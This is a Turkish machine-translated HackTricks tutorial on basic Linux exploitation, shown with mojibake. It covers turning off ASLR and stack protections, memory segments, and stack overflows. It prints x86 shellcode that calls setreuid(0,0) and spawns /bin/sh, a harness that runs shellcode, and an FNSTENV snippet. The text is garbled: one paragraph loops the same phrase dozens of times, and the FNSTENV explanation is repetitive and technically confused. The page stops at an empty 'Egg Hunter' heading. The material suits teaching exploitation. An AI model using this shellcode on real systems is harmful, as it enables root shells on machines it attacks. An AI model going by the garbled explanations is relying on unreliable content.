# Linux Exploiting (Temel) (SPA)

## Linux Exploiting (Temel) (SPA)

<details>

<summary><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)'Ä± **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>

## **ASLR**

Adres RastgeleleÅŸtirme

**Global adres rastgeleleÅŸtirmeyi devre dÄ±ÅŸÄ± bÄ±rak (root)**:\
echo 0 > /proc/sys/kernel/randomize\_va\_space\
Global adres rastgeleleÅŸtirmeyi etkinleÅŸtir: echo 2 > /proc/sys/kernel/randomize\_va\_space

**Bir yÃ¼rÃ¼tme iÃ§in devre dÄ±ÅŸÄ± bÄ±rak (root gerektirmez)**:\
setarch \`arch\` -R ./Ã¶rnek argÃ¼manlar\
setarch \`uname -m\` -R ./Ã¶rnek argÃ¼manlar

**YÄ±ÄŸÄ±n Ã¼zerindeki yÃ¼rÃ¼tme korumasÄ±nÄ± devre dÄ±ÅŸÄ± bÄ±rak**\
gcc -fno-stack-protector -D\_FORTIFY\_SOURCE=0 -z norelro -z execstack Ã¶rnek.c -o Ã¶rnek

**Core dosyasÄ±**\
ulimit -c unlimited\
gdb /exec core\_dosyasÄ±\
/etc/security/limits.conf -> \* soft core unlimited

**Metin**\
**Veri**\
**BSS**\
**Heap**

**YÄ±ÄŸÄ±n**

**BSS BÃ¶lÃ¼mÃ¼**: BaÅŸlatÄ±lmamÄ±ÅŸ global veya statik deÄŸiÅŸkenler
```
static int i;
```
**BÃ–LÃœM DATA**: Ä°lk deÄŸer atanan global veya statik deÄŸiÅŸkenler

Bu bÃ¶lÃ¼mde, Linux sistemlerindeki temel bir hafÄ±za taÅŸmasÄ± saldÄ±rÄ±sÄ± olan ESP (Execution Stack Pointer) Ã¼zerindeki Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux hedeflerini hedefleyen bir saldÄ±rÄ± tekniÄŸi olan ESP Ã¼zerinde Linux
```
int i = 5;
```
**BÃ–LÃœM TEXT**: Kod talimatlarÄ± (opcodes) talimatlarÄ±

**BÃ–LÃœM HEAP**: Dinamik olarak ayrÄ±lan tamponlar (malloc(), calloc(), realloc())

**BÃ–LÃœM STACK**: YÄ±ÄŸÄ±n (GeÃ§irilen argÃ¼manlar, Ã§evre dizeleri (env), yerel deÄŸiÅŸkenler...)

## **1. STACK TAÅMALARI**

> tampon taÅŸmasÄ±, tampon aÅŸÄ±mÄ±, yÄ±ÄŸÄ±n aÅŸÄ±mÄ±, yÄ±ÄŸÄ±n ezilmesi

Segmentation fault veya segment violation: Bir iÅŸleme atanmamÄ±ÅŸ bir bellek adresine eriÅŸmeye Ã§alÄ±ÅŸÄ±ldÄ±ÄŸÄ±nda oluÅŸur.

Bir program iÃ§inde bir fonksiyonun adresini elde etmek iÃ§in ÅŸunlar yapÄ±labilir:
```
objdump -d ./PROGRAMA | grep FUNCION
```
## ROP

### sys\_execve Ã§aÄŸrÄ±sÄ±

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

## **2.SHELLCODE**

Kernel kesintilerini gÃ¶rÃ¼ntÃ¼le: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep â€œ\_\_NR\_â€

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(â€œ/bin/shâ€, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; eax'i temizle\
xor ebx, ebx ; ebx = 0 Ã§Ã¼nkÃ¼ geÃ§irilecek bir argÃ¼man yok\
mov al, 0x01 ; eax = 1 â€”> \_\_NR\_exit 1\
int 0x80 ; Syscall'Ä± Ã§alÄ±ÅŸtÄ±r

**nasm -f elf assembly.asm** â€”> Bir .o dosyasÄ± dÃ¶ndÃ¼rÃ¼r\
**ld assembly.o -o shellcodeout** â€”> DerlenmiÅŸ kodu iÃ§eren ve opcodes'larÄ± Ã§Ä±karabileceÄŸimiz bir yÃ¼rÃ¼tÃ¼lebilir dosya verir\
**objdump -d -Mintel ./shellcodeout** â€”> Shellcode'umuz olduÄŸunu ve OpCodes'larÄ± Ã§Ä±karmak iÃ§in kullanÄ±lÄ±r

**Shellcode'un Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± kontrol etmek**
```
char shellcode[] = â€œ\x31\xc0\x31\xdb\xb0\x01\xcd\x80â€

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">â€‹</span>
```
Para doÄŸru bir ÅŸekilde sistem Ã§aÄŸrÄ±larÄ±nÄ±n gerÃ§ekleÅŸtirildiÄŸini gÃ¶rmek iÃ§in Ã¶nceki programÄ± derlemeli ve sistem Ã§aÄŸrÄ±larÄ±nÄ±n **strace ./PROGRAMA\_COMPILADO** Ã§Ä±ktÄ±sÄ±nda gÃ¶rÃ¼nmesi gerekmektedir.

Shellcode oluÅŸtururken bir hile yapÄ±labilir. Ä°lk talimat bir Ã§aÄŸrÄ±ya bir atlama yapar. Bu Ã§aÄŸrÄ±, orijinal kodu Ã§aÄŸÄ±rÄ±r ve ayrÄ±ca EIP'yi yÄ±ÄŸÄ±na yerleÅŸtirir. Call talimatÄ±ndan sonra ihtiyacÄ±mÄ±z olan dizeyi ekledik, bu nedenle bu EIP ile dizeyi iÅŸaretleyebilir ve ayrÄ±ca kodu devam ettirebiliriz.

Ã–R **HÄ°LE (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al Ãºltimo call
popl                %esi                                       ; Guardamos en ese la direcciÃ³n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=â€œ/bin/shâ€
leal                 0x8(%esi), %ecx      ; arg[2] = {â€œ/bin/shâ€, â€œ0â€}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(â€œ/bin/shâ€, [â€œ/bin/shâ€, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruciÃ³n
.string             \â€/bin/sh\â€                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">â€‹</span>
```
**Stack Kullanarak EK YÃ¼rÃ¼tme (/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; â€œ\0â€
push               dword 0x68732f2f ; â€œ//shâ€
push               dword 0x6e69622f; â€œ/binâ€
mov                ebx, esp                     ; arg1 = â€œ/bin//sh\0â€
push               eax                             ; Null -> args[1]
push               ebx                             ; â€œ/bin/sh\0â€ -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(â€œ/bin/shâ€, args[â€œ/bin/shâ€, â€œNULLâ€], NULL)
```
**EJ FNSTENV:**

Bu teknik, Linux sistemlerinde bulunan bir zafiyeti kullanarak hedef makineye kÃ¶tÃ¼ niyetli kod enjekte etmeyi amaÃ§lar. Bu, hedef makinede bir hedef iÅŸlemci kaydedicisine (ESP) kÃ¶tÃ¼ niyetli bir deÄŸer yerleÅŸtirerek gerÃ§ekleÅŸtirilir. Bu, hedef makinede bir tampon taÅŸmasÄ± zafiyeti olduÄŸunda Ã¶zellikle etkilidir.

Bu teknik, hedef makinede kÃ¶tÃ¼ niyetli kod Ã§alÄ±ÅŸtÄ±rmak iÃ§in kullanÄ±labilir. KÃ¶tÃ¼ niyetli kod, hedef sistemde yetkilendirme atlamasÄ±, gizli bilgilerin sÄ±zdÄ±rÄ±lmasÄ± veya baÅŸka zararlÄ± faaliyetler gerÃ§ekleÅŸtirmek iÃ§in kullanÄ±labilir.

Bu teknik, hedef makinede Ã§alÄ±ÅŸan bir programÄ±n tampon taÅŸmasÄ± zafiyeti olduÄŸunda kullanÄ±labilir. Bu zafiyet, bir programÄ±n bellekte ayrÄ±lan bir tamponun sÄ±nÄ±rlarÄ±nÄ± aÅŸmasÄ±na izin verir ve kÃ¶tÃ¼ niyetli bir saldÄ±rganÄ±n hedef makinede kod Ã§alÄ±ÅŸtÄ±rmasÄ±na olanak tanÄ±r.

Bu teknik, hedef makinede bir hedef iÅŸlemci kaydedicisine (ESP) kÃ¶tÃ¼ niyetli bir deÄŸer yerleÅŸtirerek gerÃ§ekleÅŸtirilir. ESP, programÄ±n yÄ±ÄŸÄ±nÄ±nÄ± iÅŸaret eden bir kaydedicidir. KÃ¶tÃ¼ niyetli bir saldÄ±rgan, ESP'yi kontrol ederek hedef makinede kÃ¶tÃ¼ niyetli kodun Ã§alÄ±ÅŸmasÄ±nÄ± saÄŸlayabilir.

Bu teknik, hedef makinede bir tampon taÅŸmasÄ± zafiyeti olduÄŸunda Ã¶zellikle etkilidir. Tampon taÅŸmasÄ±, bir programÄ±n bellekte ayrÄ±lan bir tamponun sÄ±nÄ±rlarÄ±nÄ± aÅŸmasÄ±na neden olan bir zafiyettir. Bu, kÃ¶tÃ¼ niyetli bir saldÄ±rganÄ±n hedef makinede kod Ã§alÄ±ÅŸtÄ±rmasÄ±na olanak tanÄ±r.

Bu teknik, hedef makinede kÃ¶tÃ¼ niyetli kod Ã§alÄ±ÅŸtÄ±rmak iÃ§in kullanÄ±labilir. KÃ¶tÃ¼ niyetli kod, hedef sistemde yetkilendirme atlamasÄ±, gizli bilgilerin sÄ±zdÄ±rÄ±lmasÄ± veya baÅŸka zararlÄ± faaliyetler gerÃ§ekleÅŸtirmek iÃ§in kullanÄ±labilir.
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutÃ³ fabs
â€¦
```
**Egg Hunter:**

